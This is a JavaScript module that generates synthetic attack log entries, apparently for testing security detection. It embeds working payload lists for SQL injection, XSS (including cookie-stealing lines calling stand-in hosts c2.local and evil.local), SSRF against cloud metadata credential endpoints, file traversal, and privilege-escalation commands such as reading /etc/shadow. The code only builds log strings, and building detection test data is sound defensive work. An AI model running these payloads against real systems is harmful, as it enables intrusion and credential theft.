const _createPRNG = (seed) => {
    let state = seed >>> 0;
    return () => {
        state = (state * 1664525 + 1013904223) >>> 0;
        return state;
    };
};
const SQLI_PAYLOADS = [
    "1' OR '1'='1",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL,NULL,NULL--",
    "admin'--",
    "1' AND SLEEP(5)--",
    "' OR 1=1 LIMIT 1--",
    "1' ORDER BY 10--",
    "' UNION SELECT username,password FROM users--",
    "1'; EXEC xp_cmdshell('whoami')--",
    "' OR ''='",
    "1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "1' WAITFOR DELAY '0:0:5'--",
    "admin' AND SUBSTR(password,1,1)='a'--",
    "1' UNION ALL SELECT NULL,@@version--",
    "' HAVING 1=1--",
    "1' AND (SELECT COUNT(*) FROM sysobjects)>0--",
    "'; SHUTDOWN--",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "' OR 'x'='x",
    "1' GROUP BY columnname HAVING 1=1--",
    "1 AND 1=1 UNION SELECT 1,2,3--",
    "' UNION SELECT NULL,LOAD_FILE('/etc/passwd')--",
    "1'; DECLARE @q NVARCHAR(4000);SET @q='';EXEC(@q)--",
    "') OR ('1'='1'--",
    "1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x)--"
];
const XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert('XSS')>",
    "javascript:alert(document.cookie)",
    "<body onload=alert('XSS')>",
    "<iframe src='javascript:alert(1)'>",
    "'\"><script>document.location='http://c2.local/steal?c='+document.cookie</script>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "{{constructor.constructor('return this')()}}", 
    "${7*7}", 
    "<script>fetch('http://evil.local/'+document.cookie)</script>",
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    "'-alert(1)-'",
    "<object data='data:text/html,<script>alert(1)</script>'>",
    "</title><script>alert(1)</script>",
    "<math><maction actiontype='toggle'><script>alert(1)</script></maction></math>"
];
const SSRF_TARGETS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://localhost:8080/admin",
    "http://127.0.0.1:2375/containers/json",
    "http://10.0.0.1/internal-api",
    "http://169.254.169.254/latest/user-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "http://[::1]:8080/admin",
    "http://localhost:6379/",
    "http://127.0.0.1:9200/_cat/indices",
    "http://169.254.170.2/v2/credentials",
    "file:///etc/passwd",
    "gopher://127.0.0.1:3306/_",
    "dict://127.0.0.1:11211/stats"
];
const LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\system32\\config\\sam",
    "../../../../windows/system.ini",
    "/proc/self/environ",
    "php://filter/convert.base64-encode/resource=index.php",
    "..%252f..%252f..%252fetc%252fpasswd",
    "%00../../../../etc/passwd",
    "....\\....\\....\\etc\\passwd",
    "/var/log/apache2/access.log",
    "../../../../etc/hosts",
    "/proc/self/cmdline",
    "..%c0%af..%c0%af..%c0%afetc/passwd"
];
const HTTP_ENDPOINTS = ['/api/users', '/api/products', '/api/orders', '/login', '/search', '/api/v1/data', '/dashboard', '/api/accounts', '/admin/config', '/api/v2/export'];
const SSRF_ENDPOINTS = ['/fetch', '/proxy', '/redirect', '/download', '/api/v1/webhook', '/image-resize'];
const AUTH_ENDPOINTS = ['/auth/login', '/api/v1/auth/login', '/login', '/api/token', '/oauth/token'];
const LFI_ENDPOINTS = ['/download', '/api/v1/files', '/view', '/include', '/template', '/api/export'];
const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'sqlmap/1.7.2#stable (https://sqlmap.org)',
    'python-requests/2.31.0',
    'curl/8.1.2',
    'Nikto/2.1.6',
    'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)'
];
class SyntheticTelemetryGenerator {
    constructor(options = {}) {
        this._prng = options.seed != null ? _createPRNG(options.seed) : null;
    }
    _pickRandom(arr) {
        if (this._prng) {
            return arr[this._prng() % arr.length];
        }
        return arr[Math.floor(Math.random() * arr.length)];
    }
    _randomIp(pool) {
        return this._pickRandom(pool);
    }
    _timestamp() {
        const offsetMs = this._prng ? (this._prng() % 5000) : Math.floor(Math.random() * 5000);
        return new Date(Date.now() - offsetMs).toISOString();
    }
    _randomStatus(weights = { 200: 0.3, 403: 0.15, 500: 0.4, 302: 0.1, 401: 0.05 }) {
        const r = this._prng ? (this._prng() % 100) / 100 : Math.random();
        let cumulative = 0;
        for (const [code, w] of Object.entries(weights)) {
            cumulative += w;
            if (r <= cumulative) return parseInt(code);
        }
        return 500;
    }
    _clf(ip, method, path, status, size) {
        const ts = new Date().toISOString().replace('T', ' ').replace(/\.\d+Z$/, '');
        return `${ip} - - [${ts}] "${method} ${path} HTTP/1.1" ${status} ${size}`;
    }
    generateSQLiLogs(count, sourceIpPool) {
        const entries = [];
        for (let i = 0; i < count; i++) {
            const ip = this._randomIp(sourceIpPool);
            const endpoint = this._pickRandom(HTTP_ENDPOINTS);
            const payload = this._pickRandom(SQLI_PAYLOADS);
            const encodedPayload = encodeURIComponent(payload);
            const status = this._randomStatus({ 200: 0.2, 500: 0.6, 403: 0.15, 302: 0.05 });
            const size = 100 + (this._prng ? this._prng() % 2000 : Math.floor(Math.random() * 2000));
            const fullPath = `${endpoint}?id=${encodedPayload}`;
            const ts = this._timestamp();
            entries.push({
                raw: `${ip} - - [${ts}] "GET ${fullPath} HTTP/1.1" ${status} ${size}`,
                structured: {
                    sourceIp: ip,
                    method: 'GET',
                    path: endpoint,
                    params: `id=${payload}`,
                    statusCode: status,
                    responseSize: size,
                    userAgent: this._pickRandom(USER_AGENTS),
                    attackClass: 'sqli',
                    mitreId: 'T1190',
                    severity: 'HIGH',
                    __synthetic: true,
                    timestamp: ts
                }
            });
        }
        return entries;
    }
    generateXSSLogs(count, sourceIpPool) {
        const entries = [];
        for (let i = 0; i < count; i++) {
            const ip = this._randomIp(sourceIpPool);
            const endpoint = this._pickRandom(HTTP_ENDPOINTS);
            const payload = this._pickRandom(XSS_PAYLOADS);
            const status = this._randomStatus({ 200: 0.6, 403: 0.2, 500: 0.1, 302: 0.1 });
            const size = 200 + (this._prng ? this._prng() % 3000 : Math.floor(Math.random() * 3000));
            const ts = this._timestamp();
            entries.push({
                raw: `${ip} - - [${ts}] "POST ${endpoint} HTTP/1.1" ${status} ${size} body=${payload}`,
                structured: {
                    sourceIp: ip,
                    method: 'POST',
                    path: endpoint,
                    params: payload,
                    statusCode: status,
                    responseSize: size,
                    userAgent: this._pickRandom(USER_AGENTS),
                    attackClass: 'xss',
                    mitreId: 'T1059.007',
                    severity: 'MEDIUM',
                    __synthetic: true,
                    timestamp: ts
                }
            });
        }
        return entries;
    }
    generateAuthBruteForce(count, sourceIpPool) {
        const entries = [];
        const failureCounts = {};
        for (let i = 0; i < count; i++) {
            const ip = this._randomIp(sourceIpPool);
            failureCounts[ip] = (failureCounts[ip] || 0) + 1;
            const endpoint = this._pickRandom(AUTH_ENDPOINTS);
            const ts = this._timestamp();
            const size = 50 + (this._prng ? this._prng() % 200 : Math.floor(Math.random() * 200));
            entries.push({
                raw: `${ip} - - [${ts}] "POST ${endpoint} HTTP/1.1" 401 ${size}`,
                structured: {
                    sourceIp: ip,
                    method: 'POST',
                    path: endpoint,
                    params: null,
                    statusCode: 401,
                    responseSize: size,
                    failureCount: failureCounts[ip],
                    userAgent: this._pickRandom(USER_AGENTS),
                    attackClass: 'auth_bruteforce',
                    mitreId: 'T1110',
                    severity: failureCounts[ip] >= 10 ? 'CRITICAL' : 'HIGH',
                    __synthetic: true,
                    timestamp: ts
                }
            });
        }
        return entries;
    }
    generateSSRFLogs(count, sourceIpPool) {
        const entries = [];
        for (let i = 0; i < count; i++) {
            const ip = this._randomIp(sourceIpPool);
            const endpoint = this._pickRandom(SSRF_ENDPOINTS);
            const target = this._pickRandom(SSRF_TARGETS);
            const encodedTarget = encodeURIComponent(target);
            const status = this._randomStatus({ 200: 0.5, 403: 0.2, 500: 0.2, 302: 0.1 });
            const size = 100 + (this._prng ? this._prng() % 1500 : Math.floor(Math.random() * 1500));
            const ts = this._timestamp();
            entries.push({
                raw: `${ip} - - [${ts}] "GET ${endpoint}?url=${encodedTarget} HTTP/1.1" ${status} ${size}`,
                structured: {
                    sourceIp: ip,
                    method: 'GET',
                    path: endpoint,
                    params: `url=${target}`,
                    statusCode: status,
                    responseSize: size,
                    targetUrl: target,
                    userAgent: this._pickRandom(USER_AGENTS),
                    attackClass: 'ssrf',
                    mitreId: 'T1552.005',
                    severity: 'CRITICAL',
                    __synthetic: true,
                    timestamp: ts
                }
            });
        }
        return entries;
    }
    generateLFILogs(count, sourceIpPool) {
        const entries = [];
        for (let i = 0; i < count; i++) {
            const ip = this._randomIp(sourceIpPool);
            const endpoint = this._pickRandom(LFI_ENDPOINTS);
            const payload = this._pickRandom(LFI_PAYLOADS);
            const encodedPayload = encodeURIComponent(payload);
            const status = this._randomStatus({ 200: 0.4, 403: 0.3, 500: 0.2, 404: 0.1 });
            const size = 100 + (this._prng ? this._prng() % 5000 : Math.floor(Math.random() * 5000));
            const ts = this._timestamp();
            entries.push({
                raw: `${ip} - - [${ts}] "GET ${endpoint}?file=${encodedPayload} HTTP/1.1" ${status} ${size}`,
                structured: {
                    sourceIp: ip,
                    method: 'GET',
                    path: endpoint,
                    params: `file=${payload}`,
                    statusCode: status,
                    responseSize: size,
                    userAgent: this._pickRandom(USER_AGENTS),
                    attackClass: 'lfi',
                    mitreId: 'T1190',
                    severity: 'HIGH',
                    __synthetic: true,
                    timestamp: ts
                }
            });
        }
        return entries;
    }
    generatePrivEscLogs(count, sourceIpPool) {
        const privescCommands = [
            'sudo su -', 'chmod u+s /bin/bash', 'cat /etc/shadow',
            'find / -perm -4000 -type f', '/tmp/exploit.sh',
            'pkexec --user root /bin/sh', 'dbus-send --system --dest=org.freedesktop.Accounts',
            'nsenter --target 1 --mount --uts --ipc --net --pid -- bash'
        ];
        const entries = [];
        for (let i = 0; i < count; i++) {
            const ip = this._randomIp(sourceIpPool);
            const cmd = this._pickRandom(privescCommands);
            const ts = this._timestamp();
            const success = (this._prng ? this._prng() % 100 : Math.floor(Math.random() * 100)) < 30;
            entries.push({
                raw: `<86>${ts} ${ip} kernel: [BAYEZID-EBPF] sys_enter_execve uid=1000 cmd="${cmd}" result=${success ? 0 : -1}`,
                structured: {
                    sourceIp: ip,
                    method: 'SYSCALL',
                    path: 'sys_enter_execve',
                    params: cmd,
                    statusCode: success ? 0 : -1,
                    attackClass: 'privilege_escalation',
                    mitreId: 'T1548',
                    severity: 'CRITICAL',
                    __synthetic: true,
                    timestamp: ts
                }
            });
        }
        return entries;
    }
    generateLateralMovementLogs(count, sourceIpPool) {
        const internalTargets = ['10.0.0.5', '10.0.0.10', '10.0.0.22', '172.16.0.3', '192.168.2.100'];
        const methods = ['ssh', 'psexec', 'wmi', 'rdp', 'pass-the-hash'];
        const entries = [];
        for (let i = 0; i < count; i++) {
            const ip = this._randomIp(sourceIpPool);
            const targetNode = this._pickRandom(internalTargets);
            const method = this._pickRandom(methods);
            const ts = this._timestamp();
            const success = (this._prng ? this._prng() % 100 : Math.floor(Math.random() * 100)) < 40;
            entries.push({
                raw: `<86>${ts} ${ip} sshd: ${success ? 'Accepted' : 'Failed'} publickey for root from ${targetNode} port 22 ${method}`,
                structured: {
                    sourceIp: ip,
                    method: method.toUpperCase(),
                    path: `lateral:${targetNode}:22`,
                    params: `target=${targetNode}`,
                    statusCode: success ? 0 : -1,
                    targetNode: targetNode,
                    attackClass: 'lateral_movement',
                    mitreId: 'T1021',
                    severity: 'CRITICAL',
                    __synthetic: true,
                    timestamp: ts
                }
            });
        }
        return entries;
    }
    generateMixedBatch(totalCount, sourceIpPool = ['192.168.1.47', '10.0.0.33', '172.16.0.99']) {
        const distribution = {
            sqli: 0.25,
            xss: 0.15,
            auth_bruteforce: 0.15,
            ssrf: 0.15,
            lfi: 0.10,
            privilege_escalation: 0.10,
            lateral_movement: 0.10
        };
        let all = [];
        for (const [cls, ratio] of Object.entries(distribution)) {
            const count = Math.max(1, Math.round(totalCount * ratio));
            switch (cls) {
                case 'sqli': all = all.concat(this.generateSQLiLogs(count, sourceIpPool)); break;
                case 'xss': all = all.concat(this.generateXSSLogs(count, sourceIpPool)); break;
                case 'auth_bruteforce': all = all.concat(this.generateAuthBruteForce(count, sourceIpPool)); break;
                case 'ssrf': all = all.concat(this.generateSSRFLogs(count, sourceIpPool)); break;
                case 'lfi': all = all.concat(this.generateLFILogs(count, sourceIpPool)); break;
                case 'privilege_escalation': all = all.concat(this.generatePrivEscLogs(count, sourceIpPool)); break;
                case 'lateral_movement': all = all.concat(this.generateLateralMovementLogs(count, sourceIpPool)); break;
            }
        }
        for (let i = all.length - 1; i > 0; i--) {
            const j = this._prng ? this._prng() % (i + 1) : Math.floor(Math.random() * (i + 1));
            [all[i], all[j]] = [all[j], all[i]];
        }
        return all;
    }
    generate(attackClass, count, sourceIpPool = ['192.168.1.47']) {
        switch (attackClass) {
            case 'sqli': return this.generateSQLiLogs(count, sourceIpPool);
            case 'xss': return this.generateXSSLogs(count, sourceIpPool);
            case 'auth_bruteforce': return this.generateAuthBruteForce(count, sourceIpPool);
            case 'ssrf': return this.generateSSRFLogs(count, sourceIpPool);
            case 'lfi': return this.generateLFILogs(count, sourceIpPool);
            case 'privilege_escalation': return this.generatePrivEscLogs(count, sourceIpPool);
            case 'lateral_movement': return this.generateLateralMovementLogs(count, sourceIpPool);
            default: throw new Error(`[SyntheticTelemetry] Unknown attack class: ${attackClass}`);
        }
    }
}
module.exports = { SyntheticTelemetryGenerator };
